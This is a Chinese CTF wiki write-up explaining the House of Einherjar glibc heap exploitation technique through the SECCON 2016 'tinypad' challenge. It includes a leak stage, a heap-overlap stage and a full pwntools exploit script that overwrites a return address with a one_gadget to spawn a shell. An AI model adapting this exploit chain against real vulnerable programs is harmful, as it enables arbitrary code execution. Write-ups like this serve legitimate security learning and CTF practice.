# ctf_wiki: House Of Einherjar

house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并 (consolidate backward) 操作，从而使得尽可能避免碎片化。

此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。(8 字节对齐的 chunk)

## Seccon2016: tinypad

## 功能

![](media/16055571370001/16055573072615.jpg)

## 漏洞

1. delete 功能没有置空指针，存在 uaf 漏洞。
2. 读入数据的函数存在 off-by-null 漏洞

## 利用

- leak

程序最多永远 4 个 memo，且每次都会自动打印 4 个 memo 的 content。所以可以 malloc 4 个 0x90 的 chunk，然后间隔 free 掉 3 号和 1 号 chunk。

```python
add(0x80,"a"*0x80)
add(0x80,"a"*0x20)
add(0x80,"a"*0x80)
add(0x80,"a"*0x20)
free(3)
free(1)

p.recvuntil("# CONTENT: ")
heap_base = u64(p.recvuntil("\n",drop=True).ljust(8,"\0")) - 0x120
success("heap base is -> "+ hex(heap_base))
p.recvuntil("# CONTENT: ")
p.recvuntil("# CONTENT: ")
libc.address = u64(p.recv(6).ljust(8,"\0")) - 0x3c4b78
success("libc address is -> " + hex(libc.address))

free(2)
free(4)
```

- house of enherjar

```python
add(0x18,"a"*0x18)                   # 1 0x20
add(0x100,"b"*0xf8 + p64(0x11))      # 2 0x110
add(0x100,"c"*0xf8)                  # 3 0x110
add(0x100,"d"*0xf8)                  # 4 0x110

tinypad = 0x602040
offset = heap_base + 0x20 - 0x20 - tinypad

payload = flat([
    "A"*0x20,
    0,0x101,
    tinypad+0x20,tinypad+0x20,
    ])
edit(3,payload)

free(1)
add(0x18, 'A'*0x10 + p64(offset)) # overflow 2 prev size

free(2) # unlink
edit(4, "A"*0x20 + p64(0) + p64(0x101) + p64(0x7ffff7dd1b78)*2)

# one_gadget = libc.address + 0x4527a
# one_gadget = libc.address + 0xf0364
one_gadget = libc.address + 0xf1207

environ_pointer = libc.sym['__environ']
add(0xf0, 'A'*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148)) # 0x602060

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
main_ret = u64(p.recvline().rstrip().ljust(8, '\x00')) - 0x8 * 30
success("main_ret addr -> "+ hex(main_ret))
edit(2, p64(main_ret))
edit(1,p64(one_gadget))

# gdb.attach(p,"set $h=0x603000,$g=0x602140,$t=0x602040")
p.sendline("Q")
p.interactive()
```

## exp

```python
#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./tinypad"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("(CMD)>>> ",str(idx))

def add(length,content):
    opt("A")
    p.sendlineafter("(SIZE)>>> ",str(length))
    p.sendlineafter("(CONTENT)>>> ",str(content))

def free(idx):
    opt("D")
    p.sendlineafter("(INDEX)>>> ",str(idx))

def edit(idx,content):
    opt("E")
    p.sendlineafter("(INDEX)>>> ",str(idx))
    p.sendlineafter("(CONTENT)>>> ",str(content))
    p.sendlineafter("(Y/n)>>> ","Y")

# leak heap && libc
add(0x80,"a"*0x80)
add(0x80,"a"*0x20)
add(0x80,"a"*0x80)
add(0x80,"a"*0x20)
free(3)
free(1)

p.recvuntil("# CONTENT: ")
heap_base = u64(p.recvuntil("\n",drop=True).ljust(8,"\0")) - 0x120
success("heap base is -> "+ hex(heap_base))
p.recvuntil("# CONTENT: ")
p.recvuntil("# CONTENT: ")
libc.address = u64(p.recv(6).ljust(8,"\0")) - 0x3c4b78
success("libc address is -> " + hex(libc.address))

free(2)
free(4)

add(0x18,"a"*0x18)                   # 1 0x20
add(0x100,"b"*0xf8 + p64(0x11))      # 2 0x110
add(0x100,"c"*0xf8)                  # 3 0x110
add(0x100,"d"*0xf8)                  # 4 0x110

tinypad = 0x602040
offset = heap_base + 0x20 - 0x20 - tinypad

payload = flat([
    "A"*0x20,
    0,0x101,
    tinypad+0x20,tinypad+0x20,
    ])
edit(3,payload)

free(1)
add(0x18, 'A'*0x10 + p64(offset)) # overflow 2 prev size

free(2) # unlink
edit(4, "A"*0x20 + p64(0) + p64(0x101) + p64(0x7ffff7dd1b78)*2)

# one_gadget = libc.address + 0x4527a
# one_gadget = libc.address + 0xf0364
one_gadget = libc.address + 0xf1207

environ_pointer = libc.sym['__environ']
add(0xf0, 'A'*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148)) # 0x602060

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
main_ret = u64(p.recvline().rstrip().ljust(8, '\x00')) - 0x8 * 30
success("main_ret addr -> "+ hex(main_ret))
edit(2, p64(main_ret))
edit(1,p64(one_gadget))

# gdb.attach(p,"set $h=0x603000,$g=0x602140,$t=0x602040")
p.sendline("Q")
p.interactive()
```
